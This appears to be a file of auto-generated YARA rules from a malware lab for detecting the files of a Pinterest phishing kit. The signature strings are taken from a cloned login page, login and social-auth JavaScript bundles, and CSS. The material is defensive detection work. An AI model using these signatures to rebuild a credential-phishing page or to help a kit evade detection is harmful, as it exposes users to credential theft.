      $x6 = "    </script><div id=\"fb-root\" class=\" fb_reset\"><div style=\"position: absolute; top: -10000px; height: 0px; width: 0px;\">" ascii /* score: '34.00'*/
      $s7 = "<script nonce=\"yTKrxRWJWE\">window.template_time_logging.push({template: 'webapp_head_begin_2', name: 'finish_meta_part_2', tim" ascii /* score: '30.00'*/
      $s8 = "<script nonce=\"yTKrxRWJWE\">window.template_time_logging.push({template: 'webapp_head_begin_2', name: 'finish_link_end', time: " ascii /* score: '30.00'*/
      $s9 = "<script nonce=\"yTKrxRWJWE\">window.template_time_logging.push({template: 'webapp_head_begin_2', name: 'finish_template', time: " ascii /* score: '30.00'*/
      $s10 = "<script nonce=\"yTKrxRWJWE\">window.template_time_logging.push({template: 'webapp_head_begin_2', name: 'finish_meta_part_1', tim" ascii /* score: '30.00'*/
      $s11 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"><script src=\"login_files/130492214192672\" async=\"\"></" ascii /* score: '29.00'*/
      $s12 = "    <meta property=\"og:url\" name=\"og:url\" content=\"https://www.pinterest.com/login/\" data-app=\"\">" fullword ascii /* score: '28.00'*/
      $s13 = "}</style><div data-test-login=\"true\" data-test-id=\"login\" style=\"background-color: rgb(255, 255, 255); border-radius: 8px; " ascii /* score: '28.00'*/
      $s14 = " 236}, \"traceLoggerDecider\": true, \"expns\": {}, \"adsAPIDomain\": \"https://api.pinterest.com\", \"copytune_experiments\": {" ascii /* score: '27.00'*/
      $s15 = "<script nonce=\"yTKrxRWJWE\">window.template_time_logging.push({template: 'webapp_head_begin_2', name: 'finish_meta_part_1', tim" ascii /* score: '27.00'*/
      $s16 = "<script nonce=\"yTKrxRWJWE\">window.template_time_logging.push({template: 'webapp_head_begin_2', name: 'finish_link_end', time: " ascii /* score: '27.00'*/
      $s17 = "<script nonce=\"yTKrxRWJWE\">window.template_time_logging.push({template: 'webapp_head_begin_2', name: 'finish_template', time: " ascii /* score: '27.00'*/
      $s18 = "<script nonce=\"yTKrxRWJWE\">window.template_time_logging.push({template: 'webapp_head_begin_2', name: 'finish_meta_part_2', tim" ascii /* score: '27.00'*/
      $s19 = ".fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-alig" ascii /* score: '27.00'*/
      $s20 = "{min-height:32px;z-index:2;zoom:1}.fb_iframe_widget_loader .FB_Loader{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule pjs_231_02ef0f57734d26cb9029 {
   meta:
      description = "phish__pinterest - file pjs-231-02ef0f57734d26cb9029.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "05b21a75370218e6173c464e3f7b821b296f0612a53cc376fc2638bf7e97599a"
   strings:
      $x1 = "s incorrect. {{ resetPasswordLink }}\"),{resetPasswordLink:d(i.a._(\"Reset it?\",\"Link text for password reset\"))}):Object(l.b" ascii /* score: '70.00'*/
      $x2 = "webpackJsonp([231],{\"+1LB\":function(e,t,n){\"use strict\";n.d(t,\"a\",function(){return o});var o={DEFAULT_TOGGLE:\"DEFAULT_TO" ascii /* score: '69.00'*/
      $x3 = " Click Continue to try again.\",\"Error during signup during FB email or phone collection step\");o.showError(n,e),Object(b.a)(" ascii /* score: '67.00'*/
      $x4 = "verifyRequiredSocialRegistrationFields:function e(t){return v()().then(function(e){var n=e.default;if(t===n.FACEBOOK)return L.fe" ascii /* score: '63.00'*/
      $x5 = "t match your Google account to any Pinterest account. Try resetting your password instead.\",\"Notice that no Pinterest account " ascii /* score: '63.00'*/
      $x6 = "facebookValidationError:i}:r===T.a.INVALID_PASSWORD_GOOGLE_USER&&(s={googleValidationError:i}),this.setState(Object.assign({acco" ascii /* score: '58.00'*/
      $x7 = "re not old enough just yet.\",\"Underage error during signup\")),a.setState({error:t})},a.handleSubmit=function(){var e=a.state." ascii /* score: '55.00'*/
      $x8 = "re not old enough to use Pinterest yet.\"),loading:!1}):Object(x.a)(\"/restricted/age/\",!1),i.setState({loading:!1})):(i.setSta" ascii /* score: '47.00'*/
      $x9 = "t get the email? Try these {{ tips }}\",\"Direction to help center if the password reset email failed\"),{tips:i.createElement(_" ascii /* score: '43.00'*/
      $x10 = "{inline:!0,key:\"helpCenterLink\",target:\"blank\",href:l.a.GEN.templateConst.settings.HELP_PASSWORD_RESET_URL+v},i.createElemen" ascii /* score: '41.00'*/
      $x11 = "\"',\"Arial\",\"sans-serif\",'\"Apple Color Emoji\"','\"Segoe UI Emoji\"','\"Segoe UI Symbol\"'].join(\",\")},l6Jx:function(e,t," ascii /* score: '37.00'*/
      $x12 = ",href:l.a.GEN.templateConst.settings.PASSWORD_RESET_URL},i.createElement(_.H,{bold:!0,inline:!0,key:\"tryAgain\"},u.a._(\"Try an" ascii /* score: '31.00'*/
      $x13 = "({appId:u.a.GEN.templateConst.settings.FACEBOOK_API_KEY,status:!0,xfbml:!0,version:\"v2.7\"})},function(e,n,o){var r=e.getElemen" ascii /* score: '31.00'*/
      $s14 = "ode&&d.has(n)&&(o=d.get(n)),Object(p.a)(\"unauth.login.error.API_ERROR.\"+o+\".\"+t)}}var r=n(\"oUjL\"),a=n(\"BAXv\"),i=n(\"WjSu" ascii /* score: '30.00'*/
      $s15 = "re connected, or reset your password. Or you can wait 30 minutes and try again.\",\"Statement that the users is login limited\")" ascii /* score: '30.00'*/
      $s16 = "!E&&i.createElement(h.a,{autoComplete:\"current-password\",disabled:c,hasError:!!B,id:\"password\",inputStyleOverrides:Object.as" ascii /* score: '29.00'*/
      $s17 = "uthContext:t,cssBundles:l,nextUrl:s,routeParams:a,authLoaderData:r})}else x.a.storeLoginCredentialsToBrowser(o),x.a.handleRedire" ascii /* score: '29.00'*/
      $s18 = "{AccountKit.init({appId:o.a.GEN.templateConst.settings.FACEBOOK_API_KEY,state:n,version:\"v1.1\",fbAppEventsEnabled:!0})},functi" ascii /* score: '29.00'*/
      $s19 = "re\",\"Title on desktop login modal\")};var r=ce.a.getQueryStringParams();return o.state={clearError:!1,type:\"signup\"===r.type" ascii /* score: '29.00'*/
      $s20 = "length-1];c&&c.authBundleLoader&&c.authResources&&(this.props.seoUnauthExperiments.getGroup(\"web_seamless_login_v2\")||\"\").st" ascii /* score: '29.00'*/
   condition:
      uint16(0) == 0x6577 and filesize < 600KB and
      1 of ($x*) and all of them
}

rule pjs_49_388b2e3857b09960543d {
   meta:
      description = "phish__pinterest - file pjs-49-388b2e3857b09960543d.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "593f95b46ad370cc7869b119c2e772e79942b1a593cc01f38003300a7e961d6f"
   strings:
      $x1 = "]{0,1}[\"+Ad+md+\"]*\",$$=new RegExp(\"^\"+d$+\"$\",\"i\"),n$=function(){function d($,n){if(Dd()(this,d),!n)throw new Error(\"Me" ascii /* score: '51.00'*/
      $s2 = "webpackJsonp([49],{\"+QSN\":function(d,$){d.exports=function(){}},\"+g4q\":function(d,$,n){var t=n(\"9SVM\")(\"keys\"),r=n(\"SfB" ascii /* score: '26.00'*/
      $s3 = "ild(d),d.src=\"javascript:\",(r=d.contentWindow.document).open(),r.write(\"<script>document.F=Object<\\/script>\"),r.close(),o=r" ascii /* score: '24.00'*/
      $s4 = "$){var n=U($);return n||$&&$.indexOf(\"+\")>=0&&(n=\"+\"),t(n,$$)?this.process_input(Y(n)):this.current_output}},{key:\"process_" ascii /* score: '21.00'*/
      $s5 = "y{if(t)throw r}}return dd(this.partially_populated_template,this.last_match_position+1).replace(Xd,\" \")}},{key:\"is_internatio" ascii /* score: '20.00'*/
      $s6 = "nd(\"x\",this.country_phone_code.length)+\" \"+u:u.replace(/\\d/g,\"x\"),this.template=u}}}},{key:\"format_next_national_number_" ascii /* score: '20.00'*/
      $s7 = "JP:[\"81\",\"[1-9]\\\\d{8,9}|00(?:[36]\\\\d{7,14}|7\\\\d{5,7}|8\\\\d{7})\",[[\"(\\\\d{3})(\\\\d{3})(\\\\d{3})\",\"$1-$2-$3\",[\"" ascii /* score: '20.00'*/
      $s8 = "tional_prefix||!y($,this.country_metadata))return!0}},{key:\"create_formatting_template\",value:function d($){if(!(f($).indexOf(" ascii /* score: '20.00'*/
      $s9 = "\",value:function d(){return this.parsed_input&&\"+\"===this.parsed_input[0]}},{key:\"get_format_format\",value:function d($){re" ascii /* score: '18.00'*/
      $s10 = "$)}),this.chosen_format&&-1===this.matching_formats.indexOf(this.chosen_format)&&this.reset_format()}},{key:\"get_relevant_phone" ascii /* score: '18.00'*/
      $s11 = "this.national_number.slice(0,t),this.national_number=this.national_number.slice(t),this.national_prefix}}}}},{key:\"choose_anoth" ascii /* score: '16.00'*/
      $s12 = "this.default_country:this.country=void 0}},{key:\"reset_countriness\",value:function d(){this.reset_country(),this.default_count" ascii /* score: '16.00'*/
      $s13 = " passed\");$&&n.countries[$]&&(this.default_country=$),this.metadata=n,this.reset()}return Kd()(d,[{key:\"input\",value:function" ascii /* score: '16.00'*/
      $s14 = "ice(n)};n++}return{}}function V(d,$){var n=o($);if(!d||!n)return d;var r=new RegExp(\"^(?:\"+n+\")\"),e=r.exec(d);if(!e)return d" ascii /* score: '16.00'*/
      $s15 = "this.full_phone_number(t):this.parsed_input}},{key:\"format_national_phone_number\",value:function d($){var n=void 0;this.chosen" ascii /* score: '16.00'*/
      $s16 = "tempt_to_format_complete_phone_number\",value:function d(){var $=!0,n=!1,t=void 0;try{for(var r=hd()(this.get_relevant_phone_num" ascii /* score: '16.00'*/
      $s17 = "d,$){var n=d.exports={version:\"2.4.0\"};\"number\"==typeof __e&&(__e=n)},agei:function(d,$,n){\"use strict\";$.__esModule=!0,$." ascii /* score: '16.00'*/
      $s18 = "this.partially_populated_template=void 0);this.last_match_position=this.partially_populated_template.search(Wd),this.partially_p" ascii /* score: '14.00'*/
      $s19 = "row t}}this.reset_country(),this.reset_format()}},{key:\"validate_format\",value:function d($){if(this.is_international()||this." ascii /* score: '13.00'*/
      $s20 = "this.is_international()?P(m($)):h($)}},{key:\"determine_the_country\",value:function d(){this.country=Z(this.country_phone_code," ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x6577 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule pjs_51_02ea5c5c9fb36b662bcf {
   meta:
      description = "phish__pinterest - file pjs-51-02ea5c5c9fb36b662bcf.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "e686f5e1182a1ad93bdd696ce0ad17091725ef22e525094b4c6e73a207349d12"
   strings:
      $s1 = "ion.protocol+o),a()(o,e)})},d.done=function(n){a.a.done(n)},o.default=d}});" fullword ascii /* score: '7.00'*/
      $s2 = "webpackJsonp([51],{Bq5V:function(n,o,e){\"use strict\";Object.defineProperty(o,\"__esModule\",{value:!0});var t=e(\"1RBt\"),a=e." ascii /* score: '4.00'*/
      $s3 = "={};d.ready=function(n,o){a.a.ready(n,o)},d.load=function(n,o,e){d.ready(n,function(){0===o.lastIndexOf(\"//\",0)&&(o=window.loc" ascii /* score: '3.00'*/
      $s4 = "webpackJsonp([51],{Bq5V:function(n,o,e){\"use strict\";Object.defineProperty(o,\"__esModule\",{value:!0});var t=e(\"1RBt\"),a=e." ascii /* score: '3.00'*/
   condition:
      uint16(0) == 0x6577 and filesize < 1KB and
      all of them
}

rule pjs_locale_en_US_lite_3dcf38fa608036c641ca {
   meta:
      description = "phish__pinterest - file pjs-locale-en_US-lite-3dcf38fa608036c641ca.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "1dff859813e52ec4503b52d41979141e5e1b784b63407b54c56510d2e1be8509"
   strings:
      $s1 = "webpackJsonp([\"locale-en_US-lite\"],{\"7gBT\":function(n,a,e){e(\"xjtl\");var i={locale:\"en-US\",plural:e(\"pNXP\")};n.exports" ascii /* score: '17.00'*/
      $s2 = "AD\",\"BCE\",\"CE\"],long:[\"Before Christ\",\"Anno Domini\",\"Before Common Era\",\"Common Era\"]},dayPeriods:{am:\"AM\",pm:\"P" ascii /* score: '15.00'*/
      $s3 = "Formats:{d:\"d\",E:\"ccc\",Ed:\"d E\",Ehm:\"E h:mm a\",EHm:\"E HH:mm\",Ehms:\"E h:mm:ss a\",EHms:\"E HH:mm:ss\",Gy:\"y G\",GyMMM" ascii /* score: '13.00'*/
      $s4 = "msv:\"HH:mm:ss v\",hmv:\"h:mm a v\",Hmv:\"HH:mm v\",M:\"L\",Md:\"M/d\",MEd:\"E, M/d\",MMM:\"LLL\",MMMd:\"MMM d\",MMMEd:\"E, MMM " ascii /* score: '13.00'*/
      $s5 = "d:\"MMM d, y G\",GyMMMEd:\"E, MMM d, y G\",h:\"h a\",H:\"HH\",hm:\"h:mm a\",Hm:\"HH:mm\",hms:\"h:mm:ss a\",Hms:\"HH:mm:ss\",hmsv" ascii /* score: '13.00'*/
      $s6 = "s:{am:\"AM\",pm:\"PM\"}},generic:{months:{narrow:[\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"10\",\"11\",\"12\"],sh" ascii /* score: '10.00'*/
      $s7 = ",\"Thursday\",\"Friday\",\"Saturday\"]},dayPeriods:{am:\"AM\",pm:\"PM\"}},coptic:{months:{narrow:[\"1\",\"2\",\"3\",\"4\",\"5\"," ascii /* score: '10.00'*/
      $s8 = "Wednesday\",\"Thursday\",\"Friday\",\"Saturday\"]},eras:{narrow:[\"Saka\"],short:[\"Saka\"],long:[\"Saka\"]},dayPeriods:{am:\"AM" ascii /* score: '10.00'*/
      $s9 = ",\"Tuesday\",\"Wednesday\",\"Thursday\",\"Friday\",\"Saturday\"]},eras:{narrow:[\"AH\"],short:[\"AH\"],long:[\"AH\"]},dayPeriods" ascii /* score: '10.00'*/
      $s10 = "ort:[\"AM\"],long:[\"AM\"]},dayPeriods:{am:\"AM\",pm:\"PM\"}},indian:{months:{narrow:[\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\"," ascii /* score: '10.00'*/
      $s11 = "l-Hijjah\"]},days:{narrow:[\"S\",\"M\",\"T\",\"W\",\"T\",\"F\",\"S\"],short:[\"Sun\",\"Mon\",\"Tue\",\"Wed\",\"Thu\",\"Fri\",\"S" ascii /* score: '10.00'*/
      $s12 = "],long:[\"Sunday\",\"Monday\",\"Tuesday\",\"Wednesday\",\"Thursday\",\"Friday\",\"Saturday\"]},dayPeriods:{am:\"AM\",pm:\"PM\"}}" ascii /* score: '10.00'*/
      $s13 = "iday\",\"Saturday\"]},eras:{narrow:[\"BE\"],short:[\"BE\"],long:[\"BE\"]},dayPeriods:{am:\"AM\",pm:\"PM\"}},chinese:{months:{nar" ascii /* score: '10.00'*/
      $s14 = "\"],short:[\"ERA0\",\"ERA1\"],long:[\"ERA0\",\"ERA1\"]},dayPeriods:{am:\"AM\",pm:\"PM\"}},ethioaa:{months:{narrow:[\"1\",\"2\"," ascii /* score: '10.00'*/
      $s15 = "QQ y\",yQQQQ:\"QQQQ y\"},dateFormats:{yMMMMEEEEd:\"EEEE, MMMM d, y\",yMMMMd:\"MMMM d, y\",yMMMd:\"MMM d, y\",yMd:\"M/d/yy\"},tim" ascii /* score: '10.00'*/
      $s16 = ":\"AM\",pm:\"PM\"}},dangi:{months:{narrow:[\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"10\",\"11\",\"12\"],short:[\"" ascii /* score: '10.00'*/
      $s17 = "\",XAF:\"FCFA\",XCD:\"EC$\",XOF:\"CFA\",XPF:\"CFPF\"}}})}});" fullword ascii /* score: '10.00'*/
      $s18 = "wa\",\"Heisei\"]},dayPeriods:{am:\"AM\",pm:\"PM\"}},persian:{months:{narrow:[\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9" ascii /* score: '10.00'*/
      $s19 = ",ms:\"mm:ss\",y:\"y\",yM:\"M/y\",yMd:\"M/d/y\",yMEd:\"E, M/d/y\",yMMM:\"MMM y\",yMMMd:\"MMM d, y\",yMMMEd:\"E, MMM d, y\",yMMMM:" ascii /* score: '10.00'*/
      $s20 = "wa\",\"Heisei\"]},dayPeriods:{am:\"AM\",pm:\"PM\"}},persian:{months:{narrow:[\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6577 and filesize < 80KB and
      8 of them
}

rule _opt_mal_phish__pinterest_home_ubuntu_malware_lab_samples_extracted_phishing_Pinterest_login_files_sdk_002 {
   meta:
      description = "phish__pinterest - file sdk_002.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "62dcfff1aaf3cb9b0417609ff4b6a91cc5bffcbfd8624d97cb30aab7ffeb3af8"
   strings:
      $x1 = "(function _(a,b){var c=24*60*60,d=7*c,e=\"https://developers.facebook.com/docs/accountkit/integratingweb#configureloginhtml\";e=" ascii /* score: '44.00'*/
      $x2 = "!0;c=document.getElementsByTagName(\"script\")[0];c.parentNode&&c.parentNode.insertBefore(b,c)})(\"https:\\/\\/sdk.accountkit.co" ascii /* score: '37.00'*/
      $s3 = "(function _(a,b){var c=24*60*60,d=7*c,e=\"https://developers.facebook.com/docs/accountkit/integratingweb#configureloginhtml\";e=" ascii /* score: '28.00'*/
      $s4 = "ntKit||(window.AccountKit={doNotLinkToSDKDirectly:\"doNotLinkToSDKDirectly\"});b=document.createElement(\"script\");b.src=a;b.as" ascii /* score: '22.00'*/
      $s5 = " * [http://developers.facebook.com/policy/]. This copyright notice shall be" fullword ascii /* score: '21.00'*/
      $s6 = "lease ensure the AccountKit SDK is hotlinked directly. See \"+e;b=Math.floor(new Date().getTime()/1e3)-b;if(b>d)throw new Error(" ascii /* score: '15.00'*/
      $s7 = " * You are hereby granted a non-exclusive, worldwide, royalty-free license to use," fullword ascii /* score: '13.00'*/
      $s8 = " * in connection with the web services and APIs provided by Facebook." fullword ascii /* score: '11.00'*/
      $s9 = " * FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR" fullword ascii /* score: '11.00'*/
      $s10 = " * copy, modify, and distribute this software in source code or binary form for use" fullword ascii /* score: '11.00'*/
      $s11 = " * included in all copies or substantial portions of the software." fullword ascii /* score: '11.00'*/
      $s12 = " * CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE." fullword ascii /* score: '11.00'*/
      $s13 = " * Copyright (c) 2017-present, Facebook, Inc. All rights reserved." fullword ascii /* score: '10.00'*/
      $s14 = "_US\\/sdk.js?hash=8b73d238a64cb37d9651dcda4d596877\", 1530213726);" fullword ascii /* score: '9.00'*/
      $s15 = " * IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN" fullword ascii /* score: '8.00'*/
      $s16 = " * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER" fullword ascii /* score: '8.00'*/
      $s17 = " * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR" fullword ascii /* score: '8.00'*/
      $s18 = " * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS" fullword ascii /* score: '8.00'*/
      $s19 = " * As with any software that integrates with the Facebook platform, your use of" fullword ascii /* score: '8.00'*/
      $s20 = " * this software is subject to the Facebook Platform Policy" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule pjs_22_c150d8ee52dea5f25e55 {
   meta:
      description = "phish__pinterest - file pjs-22-c150d8ee52dea5f25e55.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "0f1291e1eec0b4d17b823d7d737ff4116d014d6f5b80eafcf9722dc775914d91"
   strings:
      $x1 = "webpackJsonp([22],{\"+QQJ\":function(e,t,n){\"use strict\";n.d(t,\"a\",function(){return s}),n.d(t,\"b\",function(){return i}),n" ascii /* score: '67.00'*/
      $s2 = "ESPONSE_CODE_TOO_MANY_REQUESTS:e.api_error_code,o=n;\"API_ERROR\"===e.code&&_.has(n)&&(o=_.get(n)),Object(d.a)(\"unauth.login.er" ascii /* score: '30.00'*/
      $s3 = "\"),e.gplus_code&&(t=\"/v3/register/gplus/handshake/\"),a.a.GEN.templateConst.settings.ACCOUNTS_PINTEREST_URL+t},_._getLoginRequ" ascii /* score: '30.00'*/
      $s4 = "s[2]&&arguments[2],o=arguments[3],r=arguments[4],s=void 0;if(Object(_.a)(\"autologin.facebook_attempt.\"+t),!a.get(\"fba\")&&\"c" ascii /* score: '30.00'*/
      $s5 = "REGISTER_ATTEMPT\"],[99,\"LOGIN_PASSWORD_NOT_CREATED\"],[8,\"API_LIMIT_EXCEEDED_ERROR\"],[9,\"API_EVENT_BLOCKED_ERROR\"],[19,\"U" ascii /* score: '25.00'*/
      $s6 = "/login/gplus/handshake/\"),e.mfa_token&&(t=\"/v3/login/mfa/handshake/\"),a.a.GEN.templateConst.settings.ACCOUNTS_PINTEREST_URL+t" ascii /* score: '25.00'*/
      $s7 = "USER_NOT_FOUND\"],[88,\"LOGIN_HARD_BANNED_USER\"],[429,\"RESPONSE_CODE_TOO_MANY_REQUESTS\"]]),f=n(\"+CHb\"),h=n(\"+QQJ\"),p=i.a." ascii /* score: '25.00'*/
      $s8 = "(\"UserLogin\"),g=i.a.getLogger(\"AuthHandshake\"),b=function e(t){return t.mfa_token?\"mfa_token\":t.mfa_resend?\"mfa_resend\":" ascii /* score: '25.00'*/
      $s9 = ".loginUser(t).then(function(e){if(e.data){var o=e.data;return r.a.exchangeTokenAndSetSession(o).then(function(e){return m(t,n),g" ascii /* score: '24.00'*/
      $s10 = "ST\")},_.loginUser=function(e){var t=_._getLoginRequestUrl(e),n=_._setUpLoginParameters(e);return _._crossDomainRequest(t,n,\"PO" ascii /* score: '24.00'*/
      $s11 = "!(n.v2ActivateExperiment(\"bypass_cctld_login_email\")||\"\").startsWith(\"enabled\"):t.facebook_id?n&&!(n.v2ActivateExperiment(" ascii /* score: '23.00'*/
      $s12 = ");n.updateAuxData({login_provider:t,unauth_data:{autologin:!0}}),c.a.getInstance().addEvent(n)}},hSTm:function(e,t,n){e.exports=" ascii /* score: '23.00'*/
      $s13 = "s_cctld_login_facebook\")||\"\").startsWith(\"enabled\"):!!t.gplus_id_token&&(n&&!(n.v2ActivateExperiment(\"bypass_cctld_login_g" ascii /* score: '23.00'*/
      $s14 = "ndow.nextUrlParam;o||(r&&t?(u=n.data&&n.data.css_bundles,Object(h.b)({authContext:t,cssBundles:u,authLoaderData:r,nextUrl:g(s),r" ascii /* score: '23.00'*/
      $s15 = "api_error_code!==i.a.LOGIN_MFA_REQUIRED)throw e})}}function r(e,t,n){var o=arguments.length>3&&void 0!==arguments[3]&&arguments[" ascii /* score: '22.00'*/
      $s16 = " e})},_._verifyAndGetToken=function(){var e=a.a.GEN.templateConst.settings.ACCOUNTS_PINTEREST_URL+\"/v3/handshake/verify/\";retu" ascii /* score: '22.00'*/
      $s17 = "ion e(t){Object(_.a)(\"autologin.google_attempt.\"+n);var s={gplus_id_token:t.id_token,gplus_access_token:t.access_token,gplus_e" ascii /* score: '22.00'*/
      $s18 = "outeParams:a})):b(s))},function(e){if(e.api_error_code!==i.a.LOGIN_MFA_REQUIRED)throw e})}else Object(_.a)(\"autologin.google_fa" ascii /* score: '22.00'*/
      $s19 = "uments[2]&&arguments[2],o=e&&e[e.length-1];return!(!(o&&o.authBundleLoader&&o.authResources)||n)&&(t.getGroup(\"web_seamless_sig" ascii /* score: '21.00'*/
      $s20 = "aders:new r(this.headers),url:this.url})},h.error=function(){var e=new h(null,{status:0,statusText:\"\"});return e.type=\"error" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x6577 and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule pjs_0_5d015373385578e0d2c4 {
   meta:
      description = "phish__pinterest - file pjs-0-5d015373385578e0d2c4.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "b353dbb555f426fca0a1bf632434f605877a40552b92ebaf5a6457dd7348c832"
   strings:
      $x1 = "webpackJsonp([0],{\"/+lb\":function(n,e,t){\"use strict\";var o=t(\"1RBt\"),i=t.n(o),r={};r.ready=function(n,e){i.a.ready(n,e)}," ascii /* score: '51.00'*/
      $s2 = "n.getAccessToken();e&&c.a.create(\"UserSocialNetworkResource\",{facebook_token:e}).callUpdate({showError:!1})}},e)},injectTracki" ascii /* score: '26.00'*/
      $s3 = "it(function(n){d.logIn(n,e)},t)},logIn:function n(e,t){e&&(e.getUserID()?t(e):e.login(function(){t(e)}))},refreshAccessToken:fun" ascii /* score: '24.00'*/
      $s4 = "/en_US/sdk.js\",\"fb\"),u.a.ready(\"fb\",function(){var n=window.FB;n&&(s||(n.init({appId:r.a.FB_KEY,status:!0,version:\"v2.2\"}" ascii /* score: '19.00'*/
      $s5 = "=!0,e.src=\"//connect.facebook.net/en_US/fbds.js\";var t=document.getElementsByTagName(\"script\")[0];t.parentNode.insertBefore(" ascii /* score: '18.00'*/
      $s6 = "statechangeName\";a&&!a[y]&&a[h]&&(a[h](w,function n(){a.removeEventListener(w,n,p),a[y]=\"complete\"},p),a[y]=\"loading\"),i.ge" ascii /* score: '18.00'*/
      $s7 = "ction n(e){e.isAuthenticated()&&e.attributes.facebook_id&&!e.isLimitedLogin()&&d.ensureInit(function(n){if(n.getUserID()){var e=" ascii /* score: '16.00'*/
      $s8 = "ent.subscribe(\"auth.statusChange\",function(n){d.refreshAccessToken(t)}),s=!0),e(n))})},ensureLoggedIn:function n(e,t){d.ensure" ascii /* score: '15.00'*/
      $s9 = ":\\/\\//,f={},s={},d={},l=\"\",v={},g=\"string\",p=!1,b=\"push\",w=\"DOMContentLoaded\",y=\"readyState\",h=\"addEventListenerNam" ascii /* score: '15.00'*/
      $s10 = "d\"===n.readyState?e():setTimeout(function(){o(n,e)},100))},i=a.createElement(\"script\"),r=p,u=i.onload=i.onerror=i[m]=function" ascii /* score: '13.00'*/
      $s11 = "fore(i,c.firstChild)}var a=\"undefined\"==typeof window?null:window.document,c=a?a.getElementsByTagName(\"head\")[0]:null,u=/^ht" ascii /* score: '12.00'*/
      $s12 = "Pixel:function n(e){!function(){var n=window._fbq||(window._fbq=[]);if(!n.loaded){var e=document.createElement(\"script\");e.asy" ascii /* score: '10.00'*/
      $s13 = "=1),void r(!u.test(n)&&l?l+n+\".js\":n,g))})},0),i}function r(n,e){var t=!1,o=function(n,e){t||(\"loaded\"===n.readyState||\"com" ascii /* score: '10.00'*/
      $s14 = "t||(t=!0,i.readyState&&!/^c|loade/.test(i.readyState)||(i.onload=i[m]=null,r=1,v[n]=2,e()))};o(i,u),i.async=1,i.src=n,c.insertBe" ascii /* score: '10.00'*/
      $s15 = ",n.loaded=!0}}(),window._fbq=window._fbq||[],window._fbq.push([\"track\",e,{value:\"0.00\",currency:\"USD\"}])}};e.default=o.a.e" ascii /* score: '10.00'*/
      $s16 = "n][b](e),r&&r(a)}(n.join(\"|\")),i},i.done=function(n){i([null],n)},n.exports=i},uFsq:function(n,e,t){\"use strict\";Object.defi" ascii /* score: '7.00'*/
      $s17 = "reInit:function n(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:f.a,o=\"fb\";u.a.load([],\"//connect.facebook." ascii /* score: '7.00'*/
      $s18 = ".order=function(n,e,t){!function o(){var r=n.shift();n.length?i(r,o):i(r,e,t)}()},i.path=function(n){l=n},i.ready=function(n,e,r" ascii /* score: '7.00'*/
      $s19 = "webpackJsonp([0],{\"/+lb\":function(n,e,t){\"use strict\";var o=t(\"1RBt\"),i=t.n(o),r={};r.ready=function(n,e){i.a.ready(n,e)}," ascii /* score: '7.00'*/
      $s20 = "){var a=[];return!o(n=n[b]?n:[n],function(n){f[n]||a.push(n)})&&t(n,function(n){return f[n]})?e():function(n){d[n]||(d[n]=[]),d[" ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6577 and filesize < 9KB and
      1 of ($x*) and 4 of them
}

rule entryChunk_www_42ec251dd63eb28f1a3e87da28288e59 {
   meta:
      description = "phish__pinterest - file entryChunk-www-42ec251dd63eb28f1a3e87da28288e59.css"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "f6c98b01da8c4802d519b07c5c0dd9d2bc4b73bd625ec126170d9f3717bc9b85"
   strings:
      $s1 = "      background: url(https://s.pinimg.com/webapp/style/images/webapp-common-main-1x-c20ceaff.png) -295px -20px no-repeat;" fullword ascii /* score: '16.00'*/
      $s2 = "      background: url(https://s.pinimg.com/webapp/style/images/webapp-common-main-1x-c20ceaff.png) -276px -244px no-repeat;" fullword ascii /* score: '16.00'*/
      $s3 = "      background: url(https://s.pinimg.com/webapp/style/images/webapp-common-main-1x-c20ceaff.png) -258px -154px no-repeat;" fullword ascii /* score: '16.00'*/
      $s4 = "      background: url(https://s.pinimg.com/webapp/style/images/webapp-common-main-1x-c20ceaff.png) -261px -242px no-repeat;" fullword ascii /* score: '16.00'*/
      $s5 = "  -webkit-animation: slidefadeInLeft 0.35s cubic-bezier(0.31, 0, 0.31, 1) forwards;" fullword ascii /* score: '13.00'*/
